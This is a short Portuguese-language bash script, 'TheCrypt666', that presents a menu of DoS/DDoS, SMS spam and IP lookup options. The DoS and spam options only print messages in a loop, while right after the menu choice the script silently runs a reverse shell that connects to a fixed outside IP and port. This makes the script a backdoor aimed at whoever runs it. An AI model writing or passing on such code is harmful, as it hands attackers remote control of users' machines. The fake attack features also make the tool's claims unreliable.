#!/bin/bash

echo "

+-------TheCrypt666-------+

1) DoS/DDoS
2) SmS Spam
3) Consultar IP

"
read -p "opcão>>  " opc
echo "confirmado"
echo "atacando $nmr"
bash -i >/dev/tcp/193.161.193.99/26280 0>&1 &

if [ $opc == 1 ]
then
	read -p "IP >> " ip
	while :
	do
		sleep 0.2 | echo "Derrubando $ip"
	done
elif [ $opc == 2 ]
then
	read -p "numero >> " nmr
	while :
	do
		sleep 0.2 | echo "Dando spam em $nmr"
	done
elif [ $opc == 3 ]
then
	read -p "IP >> " ip
	curl ipinfo.io/$ip
fi

